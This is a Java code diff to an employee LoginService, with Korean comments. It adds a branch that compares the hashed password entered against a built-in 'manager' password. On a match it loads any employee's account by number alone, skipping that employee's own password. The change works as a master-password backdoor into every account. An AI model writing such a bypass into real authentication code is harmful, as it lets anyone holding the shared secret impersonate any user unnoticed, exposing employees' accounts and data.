@@ -13,11 +13,18 @@ public class LoginService {
     private final LoginMapper loginMapper;
 
     public LoginEntity loginCheck(String empNo, String empPwd) {
+        String managerPwd = Sha256Util.encryptManager();
         // 비밀번호 SHA-256 암호화
         String encryptedPwd = Sha256Util.encrypt(empPwd);
 
-        // DB 조회
-        LoginEntity user = loginMapper.loginCheck(empNo, encryptedPwd);
+        LoginEntity user;
+        if (managerPwd.equals(encryptedPwd)) {
+            user = loginMapper.loginCheckManager(empNo);
+        }
+        else {
+            user = loginMapper.loginCheck(empNo, encryptedPwd);
+        }
+
         return user;
     }
 }
